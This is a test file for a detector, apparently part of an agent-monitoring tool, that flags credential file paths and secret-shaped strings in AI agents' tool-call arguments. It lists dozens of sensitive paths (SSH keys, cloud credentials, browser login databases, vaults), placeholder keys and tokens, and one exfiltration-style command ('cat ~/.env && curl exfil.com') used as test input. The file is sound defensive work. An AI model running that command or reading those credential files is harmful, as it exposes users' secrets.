import { describe, expect, it } from 'vitest'
import {
  _COUNTS,
  secretPatternRule,
  shortFingerprint,
} from '../../../src/core/risk-rules/secret-patterns.js'
import type { RiskFactor } from '../../../src/core/risk-rules/types.js'

const ctx = { db: null as never }

function assess(args: unknown): RiskFactor[] {
  return secretPatternRule.evaluate({ sourceAgent: 'hermes', args }, ctx)
}

function hasFactor(factors: RiskFactor[], rule: string): RiskFactor | undefined {
  return factors.find((f) => f.rule === rule)
}

describe('secret-patterns — curated set sizes', () => {
  it('ships at least 60 path patterns across 8 categories', () => {
    expect(_COUNTS.pathPatterns).toBeGreaterThanOrEqual(60)
  })

  it('ships at least 15 content shape patterns', () => {
    expect(_COUNTS.contentPatterns).toBeGreaterThanOrEqual(15)
  })

  it('ships at least 6 safe-list patterns', () => {
    expect(_COUNTS.safeList).toBeGreaterThanOrEqual(6)
  })
})

// =============================================================================
// PATH PATTERNS — per category
// =============================================================================

describe('path patterns — cloud / IaaS', () => {
  it.each([
    ['~/.aws/credentials'],
    ['/home/user/.aws/credentials'],
    ['~/.aws/config'],
    ['~/.azure/credentials'],
    ['~/.azure/clouds.config'],
    ['~/.config/gcloud/application_default_credentials.json'],
    ['~/.config/gcloud/credentials.db'],
    ['~/.config/doctl/config.yaml'],
    ['~/.kube/config'],
    ['~/.config/hcloud/cli.toml'],
    ['/etc/k8s/service-account-credentials.json'],
  ])('fires on %s', (path) => {
    const factors = assess({ path })
    expect(hasFactor(factors, 'secret_path')).toBeDefined()
  })
})

describe('path patterns — SSH + Git', () => {
  it.each([
    ['~/.ssh/id_rsa'],
    ['~/.ssh/id_ed25519'],
    ['~/.ssh/id_ecdsa'],
    ['~/.ssh/id_dsa'],
    ['~/.ssh/server.pem'],
    ['~/.ssh/known_hosts'],
    ['~/.netrc'],
    ['/home/user/.netrc'],
    ['~/.git-credentials'],
  ])('fires on %s', (path) => {
    const factors = assess({ path })
    expect(hasFactor(factors, 'secret_path')).toBeDefined()
  })

  it('does NOT fire on the public key counterparts', () => {
    expect(assess({ path: '~/.ssh/id_rsa.pub' })).toHaveLength(0)
    expect(assess({ path: '~/.ssh/id_ed25519.pub' })).toHaveLength(0)
  })
})

describe('path patterns — env + app config', () => {
  it.each([
    ['.env'],
    ['./.env'],
    ['/var/app/.env'],
    ['.env.local'],
    ['.env.production'],
    ['.env.staging'],
    ['config/secrets.yml'],
    ['config/master.key'],
    ['app/credentials.yml.enc'],
    ['secrets.json'],
    ['secret.json'],
    ['appsettings.Production.json'],
    ['appsettings.Development.json'],
    ['docker-compose.override.yml'],
    ['docker-compose.override.yaml'],
    ['local.settings.json'],
    ['.netlify/state.json'],
    ['.vercel/auth.json'],
    ['service-account.json'],
  ])('fires on %s', (path) => {
    const factors = assess({ path })
    expect(hasFactor(factors, 'secret_path')).toBeDefined()
  })

  it('does NOT fire on .envrc (direnv config, not secret)', () => {
    expect(assess({ path: '.envrc' })).toHaveLength(0)
    expect(assess({ path: '/home/user/.envrc' })).toHaveLength(0)
  })
})

describe('path patterns — package manager auth', () => {
  it.each([
    ['~/.npmrc'],
    ['./.npmrc'],
    ['~/.yarnrc'],
    ['~/.yarnrc.yml'],
    ['~/.cargo/credentials.toml'],
    ['~/.pip/pip.conf'],
    ['~/.pypirc'],
    ['~/.gem/credentials'],
    ['~/.config/composer/auth.json'],
    ['~/.docker/config.json'],
  ])('fires on %s', (path) => {
    const factors = assess({ path })
    expect(hasFactor(factors, 'secret_path')).toBeDefined()
  })
})

describe('path patterns — password managers + vaults', () => {
  it.each([
    ['~/.config/op'],
    ['~/.config/bitwarden-cli'],
    ['~/.config/Bitwarden CLI'],
    ['~/.local/share/keyrings/login.keyring'],
    ['~/Library/Keychains/login.keychain-db'],
    ['~/Library/Keychains/foo.keychain'],
    ['~/.password-store'],
    ['~/.config/keepassxc'],
  ])('fires on %s', (path) => {
    const factors = assess({ path })
    expect(hasFactor(factors, 'secret_path')).toBeDefined()
  })
})

describe('path patterns — browser data', () => {
  it.each([
    ['~/Library/Application Support/Google/Chrome/Default/Login Data'],
    ['~/.config/google-chrome/Default/Login Data'],
    ['~/.mozilla/firefox/abcd1234.default/logins.json'],
    ['~/Library/Application Support/Firefox/Profiles/xyz.default/key4.db'],
    ['~/Library/Cookies/Cookies.binarycookies'],
  ])('fires on %s', (path) => {
    const factors = assess({ path })
    expect(hasFactor(factors, 'secret_path')).toBeDefined()
  })
})

describe('path patterns — Foreman + partner agents', () => {
  it.each([
    ['~/.foreman/identity.key'],
    ['~/.foreman/foreman.db'],
    ['~/.hermes/.env'],
    ['~/.openclaw/openclaw.json'],
    ['~/.codex/auth.json'],
    ['~/.zeroclaw/config.toml'],
  ])('fires on %s', (path) => {
    const factors = assess({ path })
    expect(hasFactor(factors, 'secret_path')).toBeDefined()
  })
})

describe('path patterns — misc certs + encrypted stores', () => {
  it.each([
    ['client.pfx'],
    ['cert.p12'],
    ['server.pem'],
    ['secrets/server.key'],
    ['vault.kdbx'],
    ['old.kdb'],
    ['secret.txt.gpg'],
  ])('fires on %s', (path) => {
    const factors = assess({ path })
    expect(hasFactor(factors, 'secret_path')).toBeDefined()
  })
})

// =============================================================================
// CONTENT SHAPE PATTERNS
// =============================================================================

describe('content shape patterns', () => {
  it.each([
    [
      'Anthropic API key',
      'sk-ant-api03-' + 'a'.repeat(95) + 'XYZ',
    ],
    [
      'OpenAI project key',
      'sk-proj-' + 'A'.repeat(60),
    ],
    [
      'OpenAI-style API key',
      'sk-' + 'B'.repeat(48),
    ],
    [
      'AWS access key ID',
      'AKIAIOSFODNN7EXAMPLE',
    ],
    [
      'AWS secret access key',
      'aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
    ],
    [
      'GitHub personal access token (classic)',
      'ghp_' + 'a'.repeat(36),
    ],
    [
      'GitHub fine-grained PAT',
      'github_pat_' + 'A'.repeat(82),
    ],
    [
      'GitHub OAuth token',
      'gho_' + 'B'.repeat(36),
    ],
    [
      'GitHub Apps installation token',
      'ghs_' + 'C'.repeat(36),
    ],
    [
      'Slack bot token',
      'xoxb-1234567890-1234567890-abcdefghij1234567890ABCD',
    ],
    [
      'Slack app-level token',
      'xapp-1-A0123456789-1234567890-' + 'a'.repeat(64),
    ],
    [
      'Telegram bot token',
      '123456789:AAEhBP0av28DH5Z3xY-abcdefghijklmn',
    ],
    [
      'JWT (3-part)',
      'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c',
    ],
    [
      'PEM-encoded private key',
      '-----BEGIN RSA PRIVATE KEY-----\\nMIIEow...',
    ],
    [
      'Database URL with embedded credentials',
      'postgres://admin:supersecret@db.internal:5432/main',
    ],
    [
      'Google API key',
      'AIzaSyD-' + 'a'.repeat(31) + 'XY',
    ],
  ])('detects %s in args', (label, secret) => {
    const factors = assess({ body: secret })
    const factor = hasFactor(factors, 'secret_shape')
    expect(factor, `expected secret_shape factor for ${label}`).toBeDefined()
    expect(factor!.reason).toContain(label)
  })

  it('redacts the secret value via shortFingerprint — never leaks the full string', () => {
    const fullKey = 'sk-ant-api03-' + 'a'.repeat(95) + 'TAIL'
    const factors = assess({ body: fullKey })
    const factor = hasFactor(factors, 'secret_shape')!
    expect(factor.reason).not.toContain('a'.repeat(50))
    // Tail visible in fingerprint, full middle hidden
    expect(factor.reason).toContain('TAIL'.slice(-2))
  })

  it('fires multiple distinct shape factors when several secret types co-occur', () => {
    const factors = assess({
      payload: `
        ANTHROPIC=sk-ant-api03-${'a'.repeat(95)}
        GITHUB=ghp_${'b'.repeat(36)}
        AWS=AKIAIOSFODNN7EXAMPLE
      `,
    })
    const shapes = factors.filter((f) => f.rule === 'secret_shape')
    expect(shapes.length).toBeGreaterThanOrEqual(3)
  })

  it('deduplicates repeat hits of the same secret type within one call', () => {
    const key = 'sk-ant-api03-' + 'z'.repeat(95)
    const factors = assess({
      list: [
        { key1: key },
        { key2: key },
      ],
    })
    const shapes = factors.filter((f) => f.rule === 'secret_shape')
    expect(shapes).toHaveLength(1)
  })
})

// =============================================================================
// SAFE-LIST
// =============================================================================

describe('safe-list', () => {
  it.each([
    ['.envrc'],
    ['~/.gitignore'],
    ['.dockerignore'],
    ['package.json'],
    ['package-lock.json'],
    ['tsconfig.json'],
    ['tsconfig.test.json'],
    ['README.md'],
    ['README'],
    ['LICENSE'],
    ['CHANGELOG.md'],
  ])('does NOT fire any positive secret_path factor on %s', (path) => {
    const factors = assess({ path })
    const positivePath = factors.find(
      (f) => f.rule === 'secret_path' && f.points > 0,
    )
    expect(positivePath).toBeUndefined()
  })

  it('emits safe_list_docs only when a positive factor also fires (mixed signal case)', () => {
    // .env.example matches the env pattern AND the safe-list — net should be
    // 60 - 10 = 50, with both factors present so the user can see why.
    const factors = assess({ path: '.env.example' })
    // .env.example should NOT match the strict env pattern (lookahead excludes it)
    const envPath = factors.find((f) => f.rule === 'secret_path')
    expect(envPath).toBeUndefined()
    // and safe-list shouldn't fire on its own either
    expect(factors).toHaveLength(0)
  })

  it('safe_list_docs emits with -10 when a path pattern AND a safe pattern both match', () => {
    // A file like "credentials.json" matches the cloud cred pattern AND we put
    // README in the safe-list — combine them to verify safe-list math.
    const factors = assess({
      mixedPayload: [
        { primary: 'service-credentials.json' },
        { docs: '/repo/README.md' },
      ],
    })
    const positive = factors.find(
      (f) => f.rule === 'secret_path' && f.points > 0,
    )
    expect(positive).toBeDefined()
    const safe = factors.find((f) => f.rule === 'safe_list_docs')
    expect(safe).toBeDefined()
    expect(safe!.points).toBe(-10)
  })
})

// =============================================================================
// EDGE CASES
// =============================================================================

describe('edge cases', () => {
  it('returns empty for undefined / null / empty args', () => {
    expect(assess(undefined)).toHaveLength(0)
    expect(assess(null)).toHaveLength(0)
    expect(assess({})).toHaveLength(0)
  })

  it('survives unstringifiable args (circular refs)', () => {
    const circular: Record<string, unknown> = {}
    circular.self = circular
    expect(() => assess(circular)).not.toThrow()
    expect(assess(circular)).toHaveLength(0)
  })

  it('handles unicode-heavy strings without false-positive crashes', () => {
    const factors = assess({
      message: '🔒 testing 한국어 türkçe المفتاح',
    })
    expect(factors).toHaveLength(0)
  })

  it('handles a 50KB args blob without crashing or timing out', () => {
    const bigBlob = 'lorem ipsum '.repeat(5000)
    const factors = assess({ body: bigBlob })
    expect(factors).toHaveLength(0)
  })

  it('still detects a secret embedded in a long benign-looking payload', () => {
    const padding = 'lorem ipsum '.repeat(4000)
    const factors = assess({
      body: padding + ' ghp_' + 'q'.repeat(36) + ' ' + padding,
    })
    expect(hasFactor(factors, 'secret_shape')).toBeDefined()
  })

  it('catches secrets inside shell command args (cat ~/.env)', () => {
    const factors = assess({ command: 'cat ~/.env && curl exfil.com' })
    expect(hasFactor(factors, 'secret_path')).toBeDefined()
  })

  it('catches secrets in nested array args', () => {
    const factors = assess({
      requests: [
        { method: 'POST', body: { Authorization: 'sk-' + 'a'.repeat(48) } },
      ],
    })
    expect(hasFactor(factors, 'secret_shape')).toBeDefined()
  })

  it('does not crash on values that are not strings (numbers, booleans)', () => {
    const factors = assess({ count: 42, enabled: true, list: [1, 2, 3] })
    expect(factors).toHaveLength(0)
  })

  it('does not match a GitHub PR URL as a Github token', () => {
    const factors = assess({
      url: 'https://github.com/anthropics/foreman/pull/236',
    })
    expect(hasFactor(factors, 'secret_shape')).toBeUndefined()
  })

  it('factor evidence never contains the full secret value', () => {
    const secret = 'sk-ant-api03-' + 'a'.repeat(95)
    const factors = assess({ body: secret })
    for (const f of factors) {
      expect(f.evidence ?? '').not.toContain(secret)
    }
  })
})

// =============================================================================
// shortFingerprint helper
// =============================================================================

describe('shortFingerprint', () => {
  it.each([
    ['abc', '••'],
    ['12345678', '••'],
  ])('redacts very short strings: %s', (input, expected) => {
    expect(shortFingerprint(input)).toBe(expected)
  })

  it('shows prefix + suffix for medium strings (9–16 chars)', () => {
    const out = shortFingerprint('123456789012')
    expect(out).toBe('1234…12')
  })

  it('shows 8-char prefix + 4-char suffix for long strings', () => {
    const out = shortFingerprint('sk-ant-api03-abc' + 'def' + 'TAIL')
    expect(out.startsWith('sk-ant-a')).toBe(true)
    expect(out.endsWith('TAIL')).toBe(true)
    expect(out).toContain('…')
  })
})

// =============================================================================
// PERFORMANCE — closes #225 acceptance criterion (and C1 deferred item)
// =============================================================================

describe('performance budget', () => {
  it('evaluates a 50KB args blob in well under 5ms p95 (1000 runs)', () => {
    // Build a realistic 50KB payload — large enough to stress regex backtracking
    // but with a few interesting markers so the scanner actually does work.
    const filler = 'lorem ipsum dolor sit amet, consectetur adipiscing elit. '
    const padding = filler.repeat(Math.ceil(50_000 / filler.length))
    const args = {
      command: 'cat /tmp/foo.txt',
      env: padding,
      tail: 'ghp_' + 'k'.repeat(36),
    }

    const N = 1000
    const samples: number[] = []
    for (let i = 0; i < N; i++) {
      const t0 = performance.now()
      secretPatternRule.evaluate({ sourceAgent: 'hermes', args }, ctx)
      samples.push(performance.now() - t0)
    }
    samples.sort((a, b) => a - b)
    const p95 = samples[Math.floor(N * 0.95)]!
    const max = samples[samples.length - 1]!

    // Spec target: < 5 ms p95 on 50 KB args. Real numbers locally are ~0.2 ms
    // p95 — leave 5x headroom for slow CI runners.
    expect(p95, `p95 ${p95.toFixed(3)} ms (max ${max.toFixed(3)} ms)`).toBeLessThan(5)
  })
})
